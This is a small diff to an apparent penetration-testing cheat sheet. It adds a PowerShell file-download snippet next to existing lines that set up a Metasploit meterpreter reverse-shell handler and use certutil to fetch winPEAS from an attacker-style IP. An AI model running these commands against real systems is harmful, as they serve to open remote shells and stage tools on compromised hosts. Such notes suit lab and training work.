@@ -26,6 +26,10 @@ use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 
 ```bash 
 certutil.exe -urlcache -split -f http://10.10.14.8/winPEAS-x64.exe winPEAS-x64.exe
 ```
+### Download using powershell:
+```
+powershell -c "Invoke-WebRequest -Uri URL -OutFile FILENAME"
+```
 
 ### PHP System Command:
 ```php
